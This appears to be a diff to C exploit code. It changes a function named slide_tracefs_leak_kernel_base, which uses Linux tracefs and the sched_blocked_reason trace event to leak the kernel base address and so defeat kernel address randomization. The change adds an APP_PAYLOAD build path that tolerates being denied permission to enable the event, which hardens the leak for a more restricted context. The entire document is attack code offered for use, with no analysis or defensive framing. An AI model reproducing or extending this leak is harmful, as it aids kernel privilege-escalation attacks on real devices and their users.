@@ -81,12 +81,26 @@ static int slide_tracefs_leak_kernel_base(void) {
   static const char event_enable[] =
       SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
 
-  if (!slide_tracefs_write(tracing_on, "0") ||
-      !slide_tracefs_write(event_enable, "1") ||
-      !slide_tracefs_write(tracing_on, "1")) {
+  int tracing_ready = slide_tracefs_write(tracing_on, "0");
+  int event_ready = slide_tracefs_write(event_enable, "1");
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  if (!tracing_ready) {
+    pr_error("slide tracefs control setup failed errno=%d\n", errno);
+    return 0;
+  }
+  if (!event_ready) {
+    pr_warning("slide tracefs event enable denied; probing existing events\n");
+  }
+  if (!slide_tracefs_write(tracing_on, "1")) {
+    pr_error("slide tracefs start failed errno=%d\n", errno);
+    return 0;
+  }
+#else
+  if (!tracing_ready || !event_ready || !slide_tracefs_write(tracing_on, "1")) {
     pr_error("slide tracefs setup failed errno=%d\n", errno);
     return 0;
   }
+#endif
 
   int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
   if (trace_fd >= 0) {
@@ -116,7 +130,13 @@ static int slide_tracefs_leak_kernel_base(void) {
     }
     close(fd);
   }
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+  if (event_ready) {
+    slide_tracefs_write(event_enable, "0");
+  }
+#else
   slide_tracefs_write(event_enable, "0");
+#endif
   if (!found) {
     pr_error("slide tracefs worker caller not found\n");
     return 0;
